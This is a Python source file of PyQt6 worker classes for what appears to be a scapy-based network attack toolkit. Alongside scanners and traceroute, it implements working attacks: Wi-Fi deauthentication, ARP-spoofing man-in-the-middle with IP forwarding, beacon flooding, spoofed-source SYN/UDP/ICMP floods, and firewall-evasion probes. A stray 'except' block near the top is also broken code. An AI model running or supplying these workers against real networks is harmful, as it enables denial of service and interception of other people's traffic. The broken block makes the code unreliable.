
import time
import subprocess
import logging
import socket
import random
from threading import Thread, Event
from PyQt6.QtCore import QThread, pyqtSignal
from ipaddress import ip_network

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    pass

# --- WORKERS ---

except ImportError:
    pass

class WifiScannerWorker(QThread):
    network_found = pyqtSignal(dict)
    error_occurred = pyqtSignal(str)

    def __init__(self, interface):
        super().__init__()
        self.interface = interface
        self.stop_event = Event()

    def run(self):
        def channel_hopper():
            channels = [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13, 14]
            while not self.stop_event.is_set():
                for channel in channels:
                    if self.stop_event.is_set(): break
                    try:
                        subprocess.run(
                            ['iwconfig', self.interface, 'channel', str(channel)],
                            check=True, capture_output=True, text=True
                        )
                    except Exception:
                        pass
                    time.sleep(0.5)

        hopper = Thread(target=channel_hopper, daemon=True)
        hopper.start()

        found_bssids = set()

        def packet_handler(pkt):
            if self.stop_event.is_set(): return
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                try:
                    bssid = pkt[Dot11].addr2
                    if bssid not in found_bssids:
                        try:
                            ssid = pkt[Dot11Elt].info.decode(errors="ignore")
                        except:
                            ssid = "<Hidden>"
                        if not ssid: ssid = "<Hidden>"

                        channel = "N/A"
                        try:
                            elt = pkt.getlayer(Dot11Elt, ID=3)
                            if elt: channel = ord(elt.info)
                        except: pass

                        signal = "N/A"
                        try: signal = pkt[RadioTap].dbm_antsignal
                        except: pass

                        found_bssids.add(bssid)
                        self.network_found.emit({
                            "ssid": ssid, "bssid": bssid,
                            "channel": channel, "signal": signal
                        })
                except Exception:
                    pass

        try:
            sniff(iface=self.interface, prn=packet_handler, store=False,
                  stop_filter=lambda p: self.stop_event.is_set())
        except Exception as e:
            self.error_occurred.emit(str(e))
        finally:
            self.stop_event.set()

    def stop(self):
        self.stop_event.set()
        self.wait()

class DeauthWorker(QThread):
    finished_signal = pyqtSignal()
    error_signal = pyqtSignal(str)

    def __init__(self, interface, bssid, client_mac, count):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.client_mac = client_mac
        self.count = count

    def run(self):
        try:
            dot11 = Dot11(addr1=self.client_mac, addr2=self.bssid, addr3=self.bssid)
            packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
            sendp(packet, iface=self.interface, count=self.count, inter=0.1, verbose=0)
            self.finished_signal.emit()
        except Exception as e:
            self.error_signal.emit(str(e))

class SnifferWorker(QThread):
    packet_captured = pyqtSignal(bytes)
    error_occurred = pyqtSignal(str)

    def __init__(self, interface, bpf_filter):
        super().__init__()
        self.interface = interface
        self.bpf_filter = bpf_filter
        self.stop_event = Event()

    def run(self):
        def packet_callback(packet):
             if self.stop_event.is_set(): return
             try:
                 self.packet_captured.emit(bytes(packet))
             except Exception:
                 pass

        try:
            sniff(
                iface=self.interface,
                filter=self.bpf_filter if self.bpf_filter else None,
                prn=packet_callback,
                store=0,
                stop_filter=lambda p: self.stop_event.is_set()
            )
        except Exception as e:
            self.error_occurred.emit(str(e))

    def stop(self):
        self.stop_event.set()
        self.wait()

class ArpScannerWorker(QThread):
    result_signal = pyqtSignal(list)
    error_signal = pyqtSignal(str)

    def __init__(self, target_network, interface):
        super().__init__()
        self.target_network = target_network
        self.interface = interface

    def run(self):
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.target_network)
            ans, _ = srp(pkt, timeout=2, iface=self.interface, verbose=0)

            results = []
            for sent, received in ans:
                results.append((received.psrc, received.hwsrc))
            self.result_signal.emit(results)
        except Exception as e:
            self.error_signal.emit(str(e))

class ArpSpooferWorker(QThread):
    status_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)

    def __init__(self, interface, victim_ip, target_ip):
        super().__init__()
        self.interface = interface
        self.victim_ip = victim_ip
        self.target_ip = target_ip
        self.stop_event = Event()

    def run(self):
        self._set_ip_forwarding(True)
        try:
            victim_mac = self._get_mac(self.victim_ip)
            target_mac = self._get_mac(self.target_ip)

            if not victim_mac or not target_mac:
                self.error_signal.emit(f"Could not find MAC addresses. Victim: {victim_mac}, Target: {target_mac}")
                return

            self.status_signal.emit(f"Spoofing: {self.victim_ip} ({victim_mac}) <-> {self.target_ip} ({target_mac})")

            sent_packets = 0
            while not self.stop_event.is_set():
                send(ARP(op=2, pdst=self.victim_ip, psrc=self.target_ip, hwdst=victim_mac), iface=self.interface, verbose=False)
                send(ARP(op=2, pdst=self.target_ip, psrc=self.victim_ip, hwdst=target_mac), iface=self.interface, verbose=False)
                sent_packets += 2
                if sent_packets % 10 == 0:
                    self.status_signal.emit(f"Spoofing active. Packets sent: {sent_packets}")

                for _ in range(20):
                    if self.stop_event.is_set(): break
                    time.sleep(0.1)

        except Exception as e:
            self.error_signal.emit(str(e))
        finally:
            if victim_mac and target_mac:
                self._restore_arp(self.victim_ip, self.target_ip, victim_mac, target_mac)
            self._set_ip_forwarding(False)

    def stop(self):
        self.stop_event.set()
        self.wait()

    def _get_mac(self, ip):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, iface=self.interface, verbose=False)
            if ans: return ans[0][1].hwsrc
        except: return None

    def _restore_arp(self, victim_ip, target_ip, victim_mac, target_mac):
         self.status_signal.emit("Restoring ARP tables...")
         try:
             send(ARP(op=2, pdst=victim_ip, psrc=target_ip, hwdst=victim_mac, hwsrc=target_mac), count=5, iface=self.interface, verbose=False)
             send(ARP(op=2, pdst=target_ip, psrc=victim_ip, hwdst=target_mac, hwsrc=victim_mac), count=5, iface=self.interface, verbose=False)
         except: pass

    def _set_ip_forwarding(self, enable):
        val = '1' if enable else '0'
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(val)
        except:
            pass

class PortScannerWorker(QThread):
    result_signal = pyqtSignal(dict)
    error_signal = pyqtSignal(str)

    def __init__(self, target, ports, protocol, tcp_scan_type, use_frags):
        super().__init__()
        self.target = target
        self.ports = ports
        self.protocol = protocol
        self.tcp_scan_type = tcp_scan_type
        self.use_frags = use_frags
        self.stop_event = Event()

    def run(self):
        tcp_scan_flags = {
            "SYN Scan": "S", "FIN Scan": "F", "Xmas Scan": "FPU",
            "Null Scan": "", "ACK Scan": "A"
        }
        for port in self.ports:
            if self.stop_event.is_set(): break
            try:
                pkt = None
                if self.protocol == "TCP":
                    flags = tcp_scan_flags.get(self.tcp_scan_type, "S")
                    pkt = IP(dst=self.target) / TCP(dport=port, flags=flags)
                elif self.protocol == "UDP":
                    pkt = IP(dst=self.target) / UDP(dport=port)

                if not pkt: continue

                probes = fragment(pkt) if self.use_frags else [pkt]
                resp = sr1(probes[0] if len(probes) == 1 else probes, timeout=1, verbose=0)

                state = "No Response / Filtered"
                if resp:
                    if resp.haslayer(TCP):
                        if resp.getlayer(TCP).flags == 0x12: state = "Open"
                        elif resp.getlayer(TCP).flags == 0x14: state = "Closed"
                        elif resp.getlayer(TCP).flags == 0x4: state = "Unfiltered (RST)"
                    elif resp.haslayer(UDP):
                        state = "Open | Filtered"
                    elif resp.haslayer(ICMP) and resp.getlayer(ICMP).type == 3:
                        if resp.getlayer(ICMP).code in [1, 2, 3, 9, 10, 13]:
                            state = "Filtered"
                        else:
                            state = "Closed (ICMP)"

                service = "Unknown"
                if state.startswith("Open"):
                    try:
                        service = socket.getservbyport(port, self.protocol.lower())
                    except OSError: pass

                self.result_signal.emit({
                    "port": port, "protocol": self.protocol.lower(),
                    "state": state, "service": service
                })
            except Exception as e:
                self.error_signal.emit(str(e))

    def stop(self):
        self.stop_event.set()
        self.wait()

class TracerouteWorker(QThread):
    hop_signal = pyqtSignal(dict)
    info_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)

    def __init__(self, target, interface=None):
        super().__init__()
        self.target = target
        self.interface = interface
        self.stop_event = Event()

    def run(self):
        try:
            dest_ip = socket.gethostbyname(self.target)
        except socket.gaierror:
            self.error_signal.emit(f"Cannot resolve hostname: {self.target}")
            return

        self.info_signal.emit(f"Traceroute to {self.target} ({dest_ip})")

        for i in range(1, 30):
            if self.stop_event.is_set(): break
            try:
                pkt = IP(dst=dest_ip, ttl=i) / UDP(dport=33434)
                start_time = time.time()

                reply_args = {"timeout": 2, "verbose": 0}
                if self.interface: reply_args["iface"] = self.interface

                reply = sr1(pkt, **reply_args)
                rtt = (time.time() - start_time) * 1000

                result = {"hop": i}
                if reply is None:
                    result.update({"ip": "* * *", "hostname": "Timeout", "rtt": ""})
                    self.hop_signal.emit(result)
                else:
                    hop_ip = reply.src
                    try: hop_name = socket.gethostbyaddr(hop_ip)[0]
                    except: hop_name = "Unknown"

                    result.update({"ip": hop_ip, "hostname": hop_name, "rtt": f"{rtt:.2f}"})
                    self.hop_signal.emit(result)

                    if reply.type == 3 or hop_ip == dest_ip:
                        self.info_signal.emit("Trace Complete.")
                        break
            except Exception as e:
                self.error_signal.emit(str(e))
                break

    def stop(self):
        self.stop_event.set()
        self.wait()

class PingSweepWorker(QThread):
    result_signal = pyqtSignal(str) # emits IP
    error_signal = pyqtSignal(str)

    def __init__(self, network, probe_type, ports, timeout):
        super().__init__()
        self.network = network
        self.probe_type = probe_type
        self.ports = ports
        self.timeout = timeout
        self.stop_event = Event()

    def run(self):
        try:
            net = ip_network(self.network)
        except ValueError:
            self.error_signal.emit("Invalid network CIDR.")
            return

        for host in net.hosts():
            if self.stop_event.is_set(): break
            host_str = str(host)
            reply = None
            try:
                if self.probe_type == "ICMP Echo":
                    pkt = IP(dst=host_str)/ICMP()
                    reply = sr1(pkt, timeout=self.timeout, verbose=0)
                elif self.probe_type in ["TCP SYN", "TCP ACK"]:
                    flags = "S" if self.probe_type == "TCP SYN" else "A"
                    for port in self.ports:
                        pkt = IP(dst=host_str)/TCP(dport=port, flags=flags)
                        reply = sr1(pkt, timeout=self.timeout, verbose=0)
                        if reply: break
                elif self.probe_type == "UDP Probe":
                    for port in self.ports:
                        pkt = IP(dst=host_str)/UDP(dport=port)
                        reply = sr1(pkt, timeout=self.timeout, verbose=0)
                        if reply: break

                if reply:
                    self.result_signal.emit(host_str)
            except Exception: pass

    def stop(self):
        self.stop_event.set()
        self.wait()

class BeaconFloodWorker(QThread):
    status_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)

    def __init__(self, interface, ssids_str, bssid, count, interval, enc_type, channel):
        super().__init__()
        self.interface = interface
        self.ssids = ssids_str.split(',')
        self.bssid = bssid
        self.count = count
        self.interval = interval
        self.enc_type = enc_type
        self.channel = channel
        self.stop_event = Event()

    def run(self):
        sent_count = 0
        ssid_index = 0
        infinite_mode = (self.count == 0)

        try:
            while not self.stop_event.is_set():
                if not infinite_mode and sent_count >= self.count:
                    break

                current_bssid = RandMAC() if self.bssid.lower() == 'random' else self.bssid
                current_ssid = self.ssids[ssid_index]

                beacon_frame = self._build_beacon_frame(current_ssid, current_bssid, self.channel, self.enc_type)

                sendp(beacon_frame, iface=self.interface, verbose=0)
                sent_count += 1
                ssid_index = (ssid_index + 1) % len(self.ssids)

                status_msg = f"Flooding {current_ssid}... (Packets sent: {sent_count})"
                if not infinite_mode:
                    status_msg += f" / {self.count}"
                self.status_signal.emit(status_msg)

                time.sleep(self.interval)
        except Exception as e:
            self.error_signal.emit(str(e))

    def _build_beacon_frame(self, ssid, bssid, channel, enc_type):
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)
        cap = 'ESS'
        if enc_type != "Open": cap += '+privacy'
        beacon = Dot11Beacon(cap=cap)
        essid = Dot11Elt(ID='SSID', info=ssid.encode())
        ds_param = Dot11Elt(ID='DSset', info=chr(channel).encode())
        frame = RadioTap() / dot11 / beacon / essid / ds_param

        if enc_type == "WPA2-PSK":
            rsn_info = Dot11Elt(ID='RSNinfo', info=(
                b'\\x01\\x00' b'\\x00\\x0f\\xac\\x04' b'\\x01\\x00' b'\\x00\\x0f\\xac\\x04'
                b'\\x01\\x00' b'\\x00\\x0f\\xac\\x02' b'\\x00\\x00'
            ))
            frame /= rsn_info
        elif enc_type == "WPA3-SAE":
            rsn_info = Dot11Elt(ID='RSNinfo', info=(
                b'\\x01\\x00' b'\\x00\\x0f\\xac\\x04' b'\\x01\\x00' b'\\x00\\x0f\\xac\\x04'
                b'\\x01\\x00' b'\\x00\\x0f\\xac\\x08' b'\\x8c\\x00'
            ))
            frame /= rsn_info
        return frame

    def stop(self):
        self.stop_event.set()
        self.wait()

class FlooderWorker(QThread):
    status_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)

    def __init__(self, interface, template, target_ip, target_port, count, interval, random_source):
        super().__init__()
        self.interface = interface
        self.template = template
        self.target_ip = target_ip
        self.target_port = target_port
        self.count = count
        self.interval = interval
        self.random_source = random_source
        self.stop_event = Event()

    def run(self):
        sent_count = 0
        infinite_mode = (self.count == 0)
        try:
            while not self.stop_event.is_set():
                if not infinite_mode and sent_count >= self.count: break

                src_ip = self._get_random_ip() if self.random_source else "1.2.3.4"
                pkt = None
                if self.template == "TCP SYN Flood":
                    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=src_ip, dst=self.target_ip) / TCP(sport=RandShort(), dport=self.target_port, flags="S")
                elif self.template == "UDP Flood":
                    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=src_ip, dst=self.target_ip) / UDP(sport=RandShort(), dport=self.target_port) / Raw(load=b"X"*1024)
                elif self.template == "ICMP Echo Flood":
                    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=src_ip, dst=self.target_ip) / ICMP()

                if pkt:
                    sendp(pkt, iface=self.interface, verbose=0)
                    sent_count += 1
                    status_msg = f"Packets sent: {sent_count}"
                    if not infinite_mode: status_msg += f"/{self.count}"
                    self.status_signal.emit(status_msg)

                time.sleep(self.interval)
        except Exception as e:
            self.error_signal.emit(str(e))

    def _get_random_ip(self):
        while True:
            ip = ".".join(str(random.randint(1, 223)) for _ in range(4))
            if not (ip.startswith('10.') or ip.startswith('192.168.') or (ip.startswith('172.') and 16 <= int(ip.split('.')[1]) <= 31)):
                 return ip

    def stop(self):
        self.stop_event.set()
        self.wait()

FIREWALL_PROBES = {
    "Standard SYN Scan (Top Ports)": [(lambda t: IP(dst=t)/TCP(dport=p, flags="S"), f"TCP SYN to port {p}") for p in [21, 22, 25, 53, 80, 110, 143, 443, 445, 3389, 8080]],
    "Stealthy Scans (FIN, Xmas, Null)": [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="F"), f"FIN Scan to port {p}") for p in [80, 443]
    ] + [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="FPU"), f"Xmas Scan to port {p}") for p in [80, 443]
    ] + [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags=""), f"Null Scan to port {p}") for p in [80, 443]
    ],
    "ACK Scan (Firewall Detection)": [(lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="A"), f"ACK Scan to port {p}") for p in [22, 80, 443]],
    "Source Port Evasion (DNS)": [(lambda t, p=p: IP(dst=t)/TCP(sport=53, dport=p, flags="S"), f"SYN from port 53 to {p}") for p in [80, 443, 8080]],
    "Fragmented SYN Scan": [(lambda t, p=p: fragment(IP(dst=t)/TCP(dport=p, flags="S")), f"Fragmented SYN to port {p}") for p in [80, 443]],
    "TCP Options Probes (WScale, TS)": [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="S", options=[('WScale', 10), ('Timestamp', (12345, 0))]), f"SYN+WScale+TS to port {p}") for p in [80, 443]
    ],
    "ECN Flag Probes": [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="SE"), f"SYN+ECE to port {p}") for p in [80, 443]
    ] + [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="SC"), f"SYN+CWR to port {p}") for p in [80, 443]
    ],
    "HTTP Payload Probe": [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="PA")/Raw(load="GET / HTTP/1.0\\r\\n\\r\\n"), f"HTTP GET probe to port {p}") for p in [80, 8080, 443]
    ],
    "Common UDP Probes": [(lambda t, p=p: IP(dst=t)/UDP(dport=p), f"UDP Probe to port {p}") for p in [53, 123, 161]],
    "ICMP Probes (Advanced)": [
        (lambda t: IP(dst=t)/ICMP(type=ty), f"ICMP Echo Request (Type 8)") for ty in [8]
    ] + [
        (lambda t: IP(dst=t)/ICMP(type=ty), f"ICMP Timestamp Request (Type 13)") for ty in [13]
    ] + [
        (lambda t: IP(dst=t)/ICMP(type=ty), f"ICMP Address Mask Request (Type 17)") for ty in [17]
    ],
    "Advanced Evasion Techniques": [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="S", options=[('MSS', 10)]), f"SYN with tiny MSS to port {p}") for p in [80, 443]
    ] + [
        (lambda t, p=p: IP(dst=t, flags="DF", frag=0)/TCP(dport=p, flags="S", seq=RandInt())/("X"*32), f"SYN with 'Don't Fragment' and data to port {p}") for p in [80, 443]
    ] + [
        (lambda t, p=p: IP(dst=t)/TCP(dport=p, flags="S", chksum=0xf00d), f"SYN with bad checksum to port {p}") for p in [80, 443]
    ]
}

class FirewallTesterWorker(QThread):
    result_signal = pyqtSignal(dict)
    error_signal = pyqtSignal(str)

    def __init__(self, target_ip, probe_set_name, interface):
        super().__init__()
        self.target_ip = target_ip
        self.probe_set_name = probe_set_name
        self.interface = interface
        self.stop_event = Event()

    def run(self):
        if self.probe_set_name not in FIREWALL_PROBES:
            self.error_signal.emit(f"Probe set '{self.probe_set_name}' not found.")
            return

        probe_set = FIREWALL_PROBES[self.probe_set_name]
        for i, (pkt_builder, desc) in enumerate(probe_set):
            if self.stop_event.is_set(): break
            try:
                pkt = pkt_builder(self.target_ip)
                pkt_summary = ""

                if isinstance(pkt, list):
                    pkt_summary = f"{len(pkt)} fragments"
                    ans, unans = sr(pkt, timeout=2, iface=self.interface, verbose=0)
                    resp = ans[0][1] if ans else None
                else:
                    pkt_summary = pkt.summary()
                    resp = sr1(pkt, timeout=2, iface=self.interface, verbose=0)

                result = "Responded" if resp is not None else "No Response / Blocked"

                self.result_signal.emit({
                    "description": desc,
                    "packet_summary": pkt_summary,
                    "result": result
                })

            except Exception as e:
                self.result_signal.emit({
                    "description": desc,
                    "packet_summary": "Error building packet",
                    "result": f"Error: {e}"
                })

    def stop(self):
        self.stop_event.set()
        self.wait()

class KrackScannerWorker(QThread):
    vulnerability_found = pyqtSignal(dict)
    error_occurred = pyqtSignal(str)

    def __init__(self, interface):
        super().__init__()
        self.interface = interface
        self.stop_event = Event()
        self.eapol_db = {}

    def run(self):
        try:
            sniff(iface=self.interface, prn=self._packet_handler, filter="ether proto 0x888e", stop_filter=lambda p: self.stop_event.is_set())
        except Exception as e:
            self.error_occurred.emit(str(e))

    def _packet_handler(self, pkt):
        if self.stop_event.is_set(): return
        if not pkt.haslayer(EAPOL) or not pkt.haslayer(Dot11): return
        try:
            if pkt.FCfield & 0x3 != 1: return
            key_info = pkt[EAPOL].key_info
            is_msg3 = (key_info & 0x1c0) == 0x1c0

            if is_msg3:
                bssid = pkt.addr2
                client_mac = pkt.addr1
                replay_counter = pkt[EAPOL].replay_counter
                key = (bssid, client_mac)

                if key not in self.eapol_db: self.eapol_db[key] = {}
                if replay_counter not in self.eapol_db[key]:
                    self.eapol_db[key][replay_counter] = 1
                else:
                    self.eapol_db[key][replay_counter] += 1
                    if self.eapol_db[key][replay_counter] == 2:
                        self.vulnerability_found.emit({
                            "vulnerability": "KRACK",
                            "bssid": bssid,
                            "client_mac": client_mac
                        })
                        self.eapol_db[key][replay_counter] = 0
        except: pass

    def stop(self):
        self.stop_event.set()
        self.wait()
